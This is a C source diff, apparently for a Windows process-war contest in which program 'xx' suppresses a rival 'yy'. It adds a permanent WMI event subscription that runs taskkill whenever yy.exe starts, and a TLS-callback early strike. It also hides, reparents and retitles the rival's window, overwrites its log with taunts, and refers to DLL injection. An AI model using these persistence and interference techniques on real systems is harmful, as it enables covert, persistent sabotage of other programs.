@@ -39,6 +39,67 @@ HANDLE g_hHeartbeatEvent = NULL;
 HANDLE g_hSelfHandle = NULL;   /* 收紧 DACL 之前拿到的自身进程句柄（交给 guard） */
 DWORD  g_dwOwnSession = 0;     /* 收紧 DACL 之前取到的会话号（之后取会失败） */
 CRITICAL_SECTION g_csLog;
+BOOL   g_bFreshMapping = FALSE;   /* 本次是否新建了共享内存映射（决定 salt 沿用/新生成） */
+static ULONGLONG g_dwNameToken = 0;   /* 64 位会话随机名 token：不写共享内存，只用 XxSetNames 推给各模块 */
+#define XX_WASTE_MS 200         /* 模仿 waste.c 的节奏：每 0.2 秒一条（10 条约 2 秒发完） */
+
+/* 64 位密码学随机：RtlGenRandom（advapi32 的 SystemFunction036，Win7 自带）。
+   失败才退回 rand()（有它就别用 rand：rand 的种子只含 tick+pid，可被时间窗爆破）。 */
+typedef BOOLEAN (NTAPI *RtlGenRandom_t)(PVOID, ULONG);
+
+static BOOL GenRandom64(ULONGLONG *pOut)
+{
+    static RtlGenRandom_t s_pFn = NULL;
+    static BOOL s_bTried = FALSE;
+
+    if (!pOut) return FALSE;
+    if (!s_bTried) {
+        HMODULE h = GetModuleHandleW(L"advapi32.dll");
+        s_bTried = TRUE;
+        if (!h) h = LoadLibraryW(L"advapi32.dll");
+        if (h) s_pFn = (RtlGenRandom_t)GetProcAddress(h, "SystemFunction036");
+    }
+    if (!s_pFn) return FALSE;
+    return s_pFn(pOut, (ULONG)sizeof(*pOut)) ? TRUE : FALSE;
+}
+
+/* 生成 64 位随机 token 并置最低位（保证非 0：0 是"没有 token"的哨兵值） */
+static ULONGLONG MakeNameToken(void)
+{
+    ULONGLONG t = 0;
+    if (!GenRandom64(&t)) {
+        srand(GetTickCount() * 2654435761u + GetCurrentProcessId() * 7u);
+        t = ((ULONGLONG)(DWORD)rand() << 32) ^ ((ULONGLONG)(DWORD)rand() << 16) ^ (DWORD)rand();
+    }
+    return t | 1ULL;
+}
+
+/* 命名对象用的 token：优先 RtlGenRandom 生成的 64 位值；退回共享内存的 64 位回退 token；再退回固定值 */
+static ULONGLONG NameTok(void)
+{
+    if (g_dwNameToken) return g_dwNameToken;
+    if (g_pSharedView) {
+        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
+        if (s) return s;
+    }
+    return XX_NAME_TOKEN_FIXED;
+}
+
+static void WriteLog(const WCHAR *format, ...);
+
+/* 把会话随机名推给本进程内加载的模块（同进程直接调用导出函数，不需要远程那套） */
+static void PushNamesToModule(HMODULE hMod)
+{
+    typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
+    SetNames_t pSet;
+    XX_NAME_BLOCK blk;
+
+    if (!hMod) return;
+    pSet = (SetNames_t)GetProcAddress(hMod, "XxSetNames");
+    if (!pSet) return;
+    XXNameBlockInit(&blk, NameTok(), g_dwOwnSession);
+    if (!pSet(&blk)) WriteLog(L"XxSetNames 被拒绝");
+}
 
 /* 前置声明 */
 static BOOL InitSecurityDescriptor(void);
@@ -47,7 +108,9 @@ static BOOL CreateHeartbeatSuffix(void);
 static BOOL SetupWMISubscription(void);
 static DWORD WINAPI InitThread(LPVOID lpParam);
 static DWORD WINAPI AttackThread(LPVOID lpParam);
-static void WriteLog(const WCHAR *format, ...);
+static HWND FindEnemyWindowNow(void);                          /* TLS 回调要用，先声明 */
+static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch);
+
 void RegisterSelfToXpt(void);
 
 // ------------------- 开局先杀一遍 --------------------
@@ -62,12 +125,52 @@ static void NTAPI EarlyPayload(PVOID hModule, DWORD reason, PVOID reserved)
     if (reason != DLL_PROCESS_ATTACH)
         return;
 
-    HWND hwnd = FindWindowW(L"ChallengeWindowClass", L"YY_Defensive_GUI");
-    if (hwnd)
-        PostMessageW(hwnd, WM_DESTROY, 0, 0);
+    /* loader lock 下只能做非阻塞动作：PostMessage 是异步的，安全；
+       绝不能用 SendMessage/ShowWindow（同步跨进程，对方 UI 线程卡住就把自己一起卡死）。 */
+    {
+        HWND hwnd = FindEnemyWindowNow();
+        if (hwnd) {
+            PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);     /* 未拦的消息，直接最小化 */
+            PostMessageW(hwnd, WM_CLOSE, 0, 0);
+            PostMessageW(hwnd, WM_DESTROY, 0, 0);
+        }
+    }
 
     /* 线程在 loader lock 释放后才运行，不受回调上下文限制 */
     CreateThread(NULL, 0, EarlyStrikeThread, NULL, 0, NULL);
+}
+
+/* 找 yy/ww 的窗口。**必须枚举**，不能用 FindWindow：
+   实测 lenovo_fix.exe（蜜罐）与 yy.exe **类名完全相同**（都是 YYWnd_7f3a9c1e），
+   FindWindowW 只会返回其中一个（谁先建谁先返回），另一个永远轮不到。
+   枚举时优先"进程名是 yy.exe/ww.exe"的那个，其次才是同类的其它 yy 窗口。 */
+static HWND FindEnemyWindowNow(void)
+{
+    HWND h = GetTopWindow(NULL);
+    HWND fallback = NULL;
+
+    while (h) {
+        if (IsWindow(h) && IsWindowVisible(h)) {
+            WCHAR cls[128] = L"", title[192] = L"";
+            DWORD pid = 0;
+            GetClassNameW(h, cls, _countof(cls));
+            GetWindowTextW(h, title, _countof(title));
+            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
+                WCHAR path[MAX_PATH] = L"";
+                const WCHAR *base = L"";
+                GetWindowThreadProcessId(h, &pid);
+                if (pid && GetProcessPathByPid(pid, path, MAX_PATH)) {
+                    base = wcsrchr(path, L'\\');
+                    base = base ? base + 1 : path;
+                }
+                if (_wcsicmp(base, L"yy.exe") == 0 || _wcsicmp(base, L"ww.exe") == 0)
+                    return h;                       /* 主进程优先 */
+                if (!fallback) fallback = h;        /* 蜜罐等同类窗口：留作备选 */
+            }
+        }
+        h = GetNextWindow(h, GW_HWNDNEXT);
+    }
+    return fallback;
 }
 
 /* yy 窗口可能晚于 xx 创建，有限重试 2 秒 */
@@ -75,9 +178,13 @@ static DWORD WINAPI EarlyStrikeThread(LPVOID param)
 {
     (void)param;
     for (int i = 0; i < 40; i++) {
-        HWND hwnd = FindWindowW(L"ChallengeWindowClass", L"YY_Defensive_GUI");
+        HWND hwnd = FindEnemyWindowNow();
         if (hwnd) {
-            PostMessageW(hwnd, WM_DESTROY, 0, 0);
+            /* 早期就用"隐藏 + 最小化"拿下：yy 主循环只查 IsWindow，隐藏后它不会重建 */
+            ShowWindow(hwnd, SW_HIDE);
+            PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
+            PostMessageW(hwnd, WM_CLOSE, 0, 0);
+            WriteLog(L"early strike: 已隐藏 yy 窗口");
             return 0;
         }
         Sleep(50);
@@ -194,6 +301,7 @@ static BOOL InitSharedMemory(void)
         if (!g_hSharedMem) return FALSE;
         bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
     }
+    g_bFreshMapping = bFresh;   /* 供后面决定"共享 salt 沿用还是新生成" */
 
     g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, SHARED_MEM_SIZE);
     if (!g_pSharedView) {
@@ -257,8 +365,13 @@ static BOOL CreateHeartbeatSuffix(void)
         wcsncpy_s(pWndSuffix, SUFFIX_MAX, szWndSuffix, _TRUNCATE);
     }
 
-    /* 心跳事件保留（兼容旧观察方式）；弹窗存活判据已改为 OFFSET_HB_TICK 计数器 */
-    _snwprintf(szEventName, _countof(szEventName), L"%s%s", HEARTBEAT_PREFIX, g_szHeartbeatSuffix);
+    /* 心跳事件保留（兼容旧观察方式）；弹窗存活判据已改为 OFFSET_HB_TICK 计数器。
+       事件名也带会话 token，对手按旧名抢/伪造事件没有意义。 */
+    {
+        WCHAR base[96];
+        XXNamedObject(base, _countof(base), TRUE, XX_PURPOSE_HEARTBEAT, NameTok(), 0);
+        _snwprintf(szEventName, _countof(szEventName), L"%s_%s", base, g_szHeartbeatSuffix);
+    }
     szEventName[_countof(szEventName) - 1] = L'\0';
     g_hHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, szEventName);
     if (g_hHeartbeatEvent) {
@@ -509,6 +622,79 @@ static BOOL SetupWMISubscription(void)
     WriteLog(L"WMI subscription created");
     bRet = TRUE;
 
+    /* ================== #15 反向监听：yy.exe 一被创建就抢先清理 ==================
+       yybad.md P1 #15。用同一套 WMI（还能省下自己的轮询延迟）：
+         __EventFilter "XX_YyWatchFilter" 订阅 Win32_Process 的**创建**事件；
+         CommandLineEventConsumer "XX_YyWatchConsumer" 执行 taskkill。
+       yy 的复活链一旦把它拉起来，1 秒内就会被按掉；再叠加 atkcore 30ms 的轮询与
+       我们已经删掉的对手 WMI 三件套，它想稳定活过 8 秒几乎不可能。
+       注意：这两个对象用 XX_ 前缀，不会被我们自己的 RemoveEnemyWmi（删 YY_ 前缀）误删。 */
+    {
+        IWbemClassObject *pYyFilter = NULL, *pYyConsumer = NULL, *pYyBind = NULL;
+        WCHAR szSysDir[MAX_PATH] = L"", szCmd[1024] = L"", szYyQuery[512] = L"";
+        UINT nSysLen = GetSystemDirectoryW(szSysDir, MAX_PATH);
+
+        if (nSysLen > 0 && nSysLen < MAX_PATH) {
+            swprintf_s(szCmd, _countof(szCmd),
+                       L"\"%s\\cmd.exe\" /c taskkill /f /im yy.exe & taskkill /f /im ww.exe",
+                       szSysDir);
+            swprintf_s(szYyQuery, _countof(szYyQuery),
+                       L"SELECT * FROM __InstanceCreationEvent WITHIN 1 "
+                       L"WHERE TargetInstance ISA 'Win32_Process' "
+                       L"AND TargetInstance.Name = 'yy.exe'");
+
+            do {   /* 用 do/while(FALSE) 当局部错误出口，失败不影响上面的复活订阅 */
+                hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
+                if (FAILED(hr) || !pFilterClass) { WriteLog(L"WMI(yywatch): filter class 0x%08X", hr); break; }
+                hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pYyFilter);
+                if (FAILED(hr) || !pYyFilter) { WriteLog(L"WMI(yywatch): spawn filter 0x%08X", hr); break; }
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchFilter");
+                pYyFilter->lpVtbl->Put(pYyFilter, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"WQL");
+                pYyFilter->lpVtbl->Put(pYyFilter, L"QueryLanguage", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"root\\cimv2");
+                pYyFilter->lpVtbl->Put(pYyFilter, L"EventNamespace", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szYyQuery);
+                pYyFilter->lpVtbl->Put(pYyFilter, L"Query", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_I4; var.lVal = 0;
+                pYyFilter->lpVtbl->Put(pYyFilter, L"Executability", 0, &var, CIM_FLAG_ANY);
+                hr = pServices->lpVtbl->PutInstance(pServices, pYyFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put filter 0x%08X", hr); break; }
+
+                hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
+                if (FAILED(hr) || !pConsumerClass) { WriteLog(L"WMI(yywatch): consumer class 0x%08X", hr); break; }
+                hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pYyConsumer);
+                if (FAILED(hr) || !pYyConsumer) { WriteLog(L"WMI(yywatch): spawn consumer 0x%08X", hr); break; }
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchConsumer");
+                pYyConsumer->lpVtbl->Put(pYyConsumer, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szCmd);
+                pYyConsumer->lpVtbl->Put(pYyConsumer, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_I4; var.lVal = 30;
+                pYyConsumer->lpVtbl->Put(pYyConsumer, L"KillTimeout", 0, &var, CIM_FLAG_ANY);
+                var.vt = VT_BOOL; var.boolVal = VARIANT_TRUE;
+                pYyConsumer->lpVtbl->Put(pYyConsumer, L"RunInteractively", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                hr = pServices->lpVtbl->PutInstance(pServices, pYyConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put consumer 0x%08X", hr); break; }
+
+                hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
+                if (FAILED(hr) || !pBindingClass) { WriteLog(L"WMI(yywatch): binding class 0x%08X", hr); break; }
+                hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pYyBind);
+                if (FAILED(hr) || !pYyBind) { WriteLog(L"WMI(yywatch): spawn binding 0x%08X", hr); break; }
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"__EventFilter.Name=\"XX_YyWatchFilter\"");
+                pYyBind->lpVtbl->Put(pYyBind, L"Filter", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"XX_YyWatchConsumer\"");
+                pYyBind->lpVtbl->Put(pYyBind, L"Consumer", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
+                hr = pServices->lpVtbl->PutInstance(pServices, pYyBind, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put binding 0x%08X", hr); break; }
+                WriteLog(L"WMI(yywatch) created: yy.exe 一创建就被 taskkill");
+            } while (0);
+
+            if (pYyBind) pYyBind->lpVtbl->Release(pYyBind);
+            if (pYyFilter) pYyFilter->lpVtbl->Release(pYyFilter);
+            if (pYyConsumer) pYyConsumer->lpVtbl->Release(pYyConsumer);
+        }
+    }
+
 cleanup:
     if (pBindingInstance) pBindingInstance->lpVtbl->Release(pBindingInstance);
     if (pBindingClass) pBindingClass->lpVtbl->Release(pBindingClass);
@@ -611,6 +797,46 @@ static DWORD WINAPI InitThread(LPVOID lpParam)
         WriteLog(L"Shared memory OK");
         XX_SELF_HANDLE(g_pSharedView) = (ULONGLONG)(ULONG_PTR)g_hSelfHandle;
         XX_SESSION(g_pSharedView) = (LONG)g_dwOwnSession;
+        {
+            /* ① 自身全路径：注入的 dll 是从 %TEMP% 的改名副本加载的，必须靠这个
+                  字段才能找到真正的程序目录（xx.exe/xxres.bin/同伴 dll/xpt.xpt）。
+               ② 共享 salt：映射**已经存在**（还有别的实例活着）就沿用旧值，不能重新随机 ——
+                  否则各实例算出的临时副本名/回退锁名会不一致。
+               ③ 会话随机名 token：**不写共享内存**，只在注入/加载时用 XxSetNames 推给各模块
+                  （方案 A：远程调用，读完由注入方清零释放）。 */
+            WCHAR self[MAX_PATH] = L"";
+            if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
+                if (wcslen(self) < XX_PATH_MAX) {
+                    wcsncpy_s(XX_XXPATH(g_pSharedView), XX_PATH_MAX, self, _TRUNCATE);
+                    WriteLog(L"xx path: %s", self);
+                } else {
+                    /* 放不下就宁可不写：写进去的截断路径会让注入副本推错目录，
+                       留空各模块会退回自己的模块路径（至少 xx.exe 本体是对的）。 */
+                    XX_XXPATH(g_pSharedView)[0] = L'\0';
+                    WriteLog(L"xx path 太长（%u 字符 > %d），不写入共享内存", (unsigned)wcslen(self), XX_PATH_MAX - 1);
+                }
+            }
+            if (g_bFreshMapping || XX_TMP_SALT(g_pSharedView) == 0) {
+                srand(GetTickCount() ^ (GetCurrentProcessId() << 4));
+                XX_TMP_SALT(g_pSharedView) = (((DWORD)rand() << 16) ^ (DWORD)rand()) | 1u;
+                WriteLog(L"shared salt: NEW（值不落日志：共享内存里本来就有，日志不该再多一份副本）");
+            } else {
+                WriteLog(L"shared salt: REUSE（沿用旧值）");
+            }
+            /* 共享内存里的 64 位**回退** token：映射已存在就沿用（xx 重启不换名），
+               否则用 RtlGenRandom 新生成。它是"拿不到秘密 token 的实例"之间的共同值，
+               所以可被能解析我们映射的对手读到 —— 真正的秘密 token 在下面、不写共享内存。 */
+            if (g_bFreshMapping || XX_NAME_TOKEN64(g_pSharedView) == 0) {
+                XX_NAME_TOKEN64(g_pSharedView) = MakeNameToken();
+                WriteLog(L"fallback token64: NEW（不落日志）");
+            } else {
+                WriteLog(L"fallback token64: REUSE（沿用旧值）");
+            }
+            /* 真正的秘密 token：64 位、RtlGenRandom 生成、**不写共享内存**，
+               只经 XxSetNames 推给各模块（参数块读完清零）。 */
+            g_dwNameToken = MakeNameToken();
+            WriteLog(L"name token: 64-bit generated（值不落任何日志/文件/共享内存）");
+        }
     }
 
     if (!CreateHeartbeatSuffix()) {
@@ -621,6 +847,7 @@ static DWORD WINAPI InitThread(LPVOID lpParam)
 
     WriteLog(L"Loading svcguard.dll...");
     HMODULE hDeamon = LoadLibraryW(L"svcguard.dll");
+    PushNamesToModule(hDeamon);   /* 方案 A：把会话随机名推给 svcguard */
     if (hDeamon) {
         WriteLog(L"svcguard.dll loaded");
         typedef void (WINAPI *DeamonInit_t)(void);
@@ -636,9 +863,10 @@ static DWORD WINAPI InitThread(LPVOID lpParam)
     }
 
     /* window.dll 必须在慢速初始化（WMI 订阅）之前加载：
-       弹窗出现得越早、抢到 Local\xx_window_guard 越早，8 秒红线越安全。 */
+       弹窗出现得越早、抢到 Local\xx_wg_<token> 越早，8 秒红线越安全。 */
     WriteLog(L"Loading window.dll...");
     HMODULE hWin = LoadLibraryW(L"window.dll");
+    PushNamesToModule(hWin);
     if (hWin) {
         WriteLog(L"window.dll loaded");
     } else {
@@ -657,6 +885,7 @@ static DWORD WINAPI InitThread(LPVOID lpParam)
     /* defense.dll：动态导入 StartDefense，在新线程运行（避免 Hook 影响 xx 主流程） */
     WriteLog(L"Loading defense.dll...");
     HMODULE hDef = LoadLibraryW(L"defense.dll");
+    PushNamesToModule(hDef);
     if (hDef) {
         typedef void (WINAPI *StartDefense_t)(void);
         StartDefense_t pDef = (StartDefense_t)GetProcAddress(hDef, "StartDefense");
@@ -672,6 +901,247 @@ static DWORD WINAPI InitThread(LPVOID lpParam)
     }
 
     return 0;
+}
+
+/* ================== 对 yy 窗口的利用（依据 yybad.md 第一章，DDoS 项不做） ==================
+   1.1 WM_DESTROY/DestroyWindow：yy 的 WndProc 里 `if (msg==WM_DESTROY) return 0;` 是白写，
+       但**跨进程 DestroyWindow 也必然失败**（只有创建窗口的那个线程能销毁它），
+       所以真正让它"消失"的是 1.3 + 1.5：隐藏 + 挂到不可见父窗口。
+       yy 主循环只查 `!g_hMainWnd || !IsWindow(g_hMainWnd)`，隐藏后窗口依然"存在"
+       → 它永远不会重建 → 8 秒后判负。这里仍尝试一次 DestroyWindow 并把结果写日志。
+   1.2 WM_SETTEXT 未被拦截 → 走系统消息编组把标题改成我方窗口名（跨进程安全）。
+   1.3 SetParent 到我们自己建的不可见窗口 → 即使 yy 自己再 ShowWindow 也看不见。
+   1.5 其它未处理消息：SC_MINIMIZE / WM_ENABLE(FALSE)。
+   1.6 日志框是标准 EDIT：用 WM_GETTEXT + WM_SETTEXT 追加嘲讽 / 整段清空。
+       注意**不能用 EM_REPLACESEL**：它带字符串指针，跨进程不会被编组，目标会读到野指针
+       （yybad.md 里那段代码是错的，会直接把 yy 搞崩或读到乱码）；WM_SETTEXT / WM_GETTEXT
+       是窗口管理器会代为编组的消息，才是跨进程唯一安全的写法。 */
+static HWND  g_hHiddenParent = NULL;
+static DWORD g_dwLastTaunt = 0;
+static int   g_nTauntIdx = 0;
+static BOOL  g_bDestroyTried = FALSE;
+
+static const WCHAR *g_taunts[] = {
+    L"[xx] yy.exe is just a waste\r\n",
+    L"[xx] your log is mine now\r\n",
+    L"[xx] xx_ALIVE_WND > YY_Defensive_GUI\r\n",
+    L"[xx] ni de tanchuang yi jing gui wo le\r\n"
+};
+
+static void TauntEnemyLog(HWND hEnemy)
+{
+    HWND hLog;
+    WCHAR buf[2048];
+    DWORD now = GetTickCount();
+    int len;
+
+    if (!hEnemy) return;
+    if (now - g_dwLastTaunt < XX_WASTE_MS) return;   /* 与 waste 一致：2 秒一条 */
+    g_dwLastTaunt = now;
+
+    hLog = FindWindowExW(hEnemy, NULL, L"EDIT", NULL);   /* yy 的日志框 */
+    if (!hLog) return;
+
+    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
+    if (len < 0) len = 0;
+    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
+    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
+    else buf[0] = L'\0';
+    buf[len] = L'\0';
+
+    if ((g_nTauntIdx % 5) == 0)
+        wcscpy_s(buf, _countof(buf), g_taunts[0]);        /* 每 5 次整段清空重写 */
+    else
+        wcsncat_s(buf, _countof(buf), g_taunts[g_nTauntIdx % 4], _TRUNCATE);
+
+    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);
+    g_nTauntIdx++;
+}
+
+/* 这个窗口是不是**我们自己**的弹窗？
+   注意绝不能用"该进程里有没有我们的 window 模块"来判断 —— 我们会把 window.dll
+   注入进 yy 的子进程（蜜罐 lenovo_fix.exe 之类），那样它的窗口会被误判成我方窗口
+   直接跳过，结果它的标题一直没人动（实测就是这么漏的）。
+   可靠的判据只有两条：① 类名符合我方格式 `wnd_<16 位十六进制>`；
+   ② 共享内存的弹窗持有者表里登记的正是这个句柄。 */
+static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch)
+{
+    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    DWORD n = cch;
+    BOOL ok = FALSE;
+    if (h) {
+        ok = QueryFullProcessImageNameW(h, 0, path, &n) ? TRUE : FALSE;
+        CloseHandle(h);
+    }
+    if (!ok && cch) path[0] = L'\0';
+    return ok;
+}
+static BOOL IsOurPopupClass(const WCHAR *cls)
+{
+    int i;
+    if (!cls) return FALSE;
+    if (wcsncmp(cls, L"wnd_", 4) != 0) return FALSE;
+    if (wcslen(cls) != 20) return FALSE;
+    for (i = 4; i < 20; i++) {
+        WCHAR c = cls[i];
+        if (!((c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f'))) return FALSE;
+    }
+    return TRUE;
+}
+
+static BOOL IsOurOwnPopupWindow(HWND hWnd, const WCHAR *cls)
+{
+    HANDLE hMap;
+    PVOID view;
+    int i;
+
+    if (IsOurPopupClass(cls)) return TRUE;
+
+    hMap = XXOpenShared();
+    if (!hMap) return FALSE;
+    view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
+    if (!view) { CloseHandle(hMap); return FALSE; }
+    for (i = 0; i < OWNER_SLOTS; i++) {
+        if ((HWND)(ULONG_PTR)XX_SLOT_HWND(view, i) == hWnd) {
+            UnmapViewOfFile(view);
+            CloseHandle(hMap);
+            return TRUE;
+        }
+    }
+    UnmapViewOfFile(view);
+    CloseHandle(hMap);
+    return FALSE;
+}
+
+/* ================== 模仿用户的 waste：每 2 秒给 yy 主进程一条嘲讽 ==================
+   waste.c 的做法：每轮**重新 FindWindow**（句柄会变）、标题改成 `xx_ALIVE_WND`、
+   往日志框追加一条带时间戳的 "yy.exe is just a waste"。
+   这里照抄这个节奏（2 秒一条），但用系统会跨进程编组的 WM_GETTEXT/WM_SETTEXT 写入，
+   并且**枚举**而不是 FindWindow（lenovo 与 yy 类名相同，FindWindow 只拿到第一个）。 */
+
+static HWND FindYyMainWindowForWaste(void)
+{
+    HWND h = GetTopWindow(NULL);
+    HWND fallback = NULL;
+    while (h) {
+        if (IsWindow(h) && IsWindowVisible(h)) {
+            WCHAR cls[128] = L"", title[192] = L"", leaf[MAX_PATH] = L"";
+            DWORD pid = 0;
+            GetClassNameW(h, cls, _countof(cls));
+            GetWindowTextW(h, title, _countof(title));
+            GetWindowThreadProcessId(h, &pid);
+            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
+                const WCHAR *base = L"";
+                WCHAR path[MAX_PATH] = L"";
+                if (pid && GetProcessPathByPid(pid, path, MAX_PATH)) {
+                    base = wcsrchr(path, L'\\');
+                    base = base ? base + 1 : path;
+                }
+                wcsncpy_s(leaf, MAX_PATH, base, _TRUNCATE);
+                if (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0)
+                    return h;            /* 主进程优先 */
+                if (!fallback) fallback = h;
+            }
+        }
+        h = GetNextWindow(h, GW_HWNDNEXT);
+    }
+    return fallback;
+}
+
+static void WasteOneShot(void)
+{
+    HWND h = FindYyMainWindowForWaste();
+    HWND hLog;
+    WCHAR buf[2048];
+    WCHAR line[160];
+    SYSTEMTIME st;
+    int len;
+
+    if (!h) return;
+    SetWindowTextW(h, L"xx_ALIVE_WND");            /* 与 waste.c 完全一致的标题 */
+    hLog = FindWindowExW(h, NULL, L"EDIT", NULL);
+    if (!hLog) return;
+
+    GetLocalTime(&st);
+    _snwprintf(line, _countof(line) - 1,
+               L"[%02d-%02d-%02d] System Shield Active. yy.exe is just a waste.\r\n",
+               st.wDay, st.wMonth, st.wSecond);
+    line[_countof(line) - 1] = L'\0';
+
+    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
+    if (len < 0) len = 0;
+    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
+    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
+    else buf[0] = L'\0';
+    buf[len] = L'\0';
+    wcsncat_s(buf, _countof(buf), line, _TRUNCATE);
+    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);
+}
+
+static DWORD WINAPI WasteMimicThread(LPVOID lp)
+{
+    UNREFERENCED_PARAMETER(lp);
+    for (;;) {
+        WasteOneShot();
+        Sleep(XX_WASTE_MS);
+    }
+    return 0;
+}
+
+static void StartWasteMimic(void)
+{
+    static LONG s_bStarted = 0;
+    if (InterlockedCompareExchange(&s_bStarted, 1, 0) == 0) {
+        HANDLE h = CreateThread(NULL, 0, WasteMimicThread, NULL, 0, NULL);
+        if (h) CloseHandle(h);
+        WriteLog(L"waste 模仿线程已启动（每 2 秒给 yy 主进程一条嘲讽）");
+    }
+}
+
+/* yy 本体：只嘲讽不压制。新规则是先连发 10 条嘲讽，之后由 atkcore 结束它的进程树；
+   一旦我们隐藏/挂父窗口/最小化，嘲讽就没人看得见了（标题用 waste.c 的同款写法）。 */
+static void TauntEnemyWindowOnly(HWND hWnd)
+{
+    if (!hWnd || !IsWindow(hWnd)) return;
+    SetWindowTextW(hWnd, L"xx_ALIVE_WND");
+    TauntEnemyLog(hWnd);
+}
+static void AttackEnemyWindow(HWND hWnd, const WCHAR *ownSuffix)
+{
+    WCHAR spoof[128];
+
+    if (!hWnd || !IsWindow(hWnd)) return;
+
+    /* 1.2 改标题（伪装成我方窗口） */
+    if (ownSuffix && ownSuffix[0])
+        _snwprintf(spoof, _countof(spoof), L"xx_ALIVE_WND_%s", ownSuffix);
+    else
+        wcscpy_s(spoof, _countof(spoof), L"xx_ALIVE_WND");
+    spoof[_countof(spoof) - 1] = L'\0';
+    SetWindowTextW(hWnd, spoof);
+
+    /* 1.5 未拦的消息：最小化 + 禁用 */
+    PostMessageW(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
+    PostMessageW(hWnd, WM_ENABLE, FALSE, 0);
+
+    /* 1.3 挂到不可见父窗口（先建一个），再隐藏 */
+    if (!g_hHiddenParent) {
+        g_hHiddenParent = CreateWindowExW(0, L"STATIC", L"", 0,
+                                          0, 0, 0, 0, NULL, NULL,
+                                          GetModuleHandleW(NULL), NULL);
+    }
+    if (g_hHiddenParent) SetParent(hWnd, g_hHiddenParent);
+    ShowWindow(hWnd, SW_HIDE);
+
+    /* 1.1 试一次 DestroyWindow，仅记录结果（跨进程必然失败） */
+    if (!g_bDestroyTried) {
+        g_bDestroyTried = TRUE;
+        if (DestroyWindow(hWnd)) WriteLog(L"DestroyWindow(yy 窗口) 成功");
+        else WriteLog(L"DestroyWindow(yy 窗口) 失败（跨进程限制）-> 已改用隐藏+挂不可见父窗口");
+    }
+
+    /* 1.6 日志嘲讽 */
+    TauntEnemyLog(hWnd);
 }
 
 /* ================== 攻击线程（保持不变，已稳定） ================== */
@@ -693,6 +1163,7 @@ static DWORD WINAPI AttackThread(LPVOID lpParam)
     }
 
     HMODULE hKill = LoadLibraryW(L"atkcore.dll");
+    PushNamesToModule(hKill);
     if (hKill) {
         typedef void (WINAPI *StartAttack_t)(void);
         StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
@@ -703,6 +1174,7 @@ static DWORD WINAPI AttackThread(LPVOID lpParam)
     }
 
     WriteLog(L"Window spoofing active");
+    StartWasteMimic();      /* 模仿 waste.c：每 2 秒给 yy 主进程一条嘲讽 */
 
     while (1) {
         HWND hWnd = GetTopWindow(NULL);
@@ -713,16 +1185,18 @@ static DWORD WINAPI AttackThread(LPVOID lpParam)
             WCHAR cls[128] = { 0 };
             GetClassNameW(hWnd, cls, _countof(cls));
 
-            BOOL bOwn = FALSE;
-            if (wcsstr(cls, L"XX_ALIVE_WND_")) {
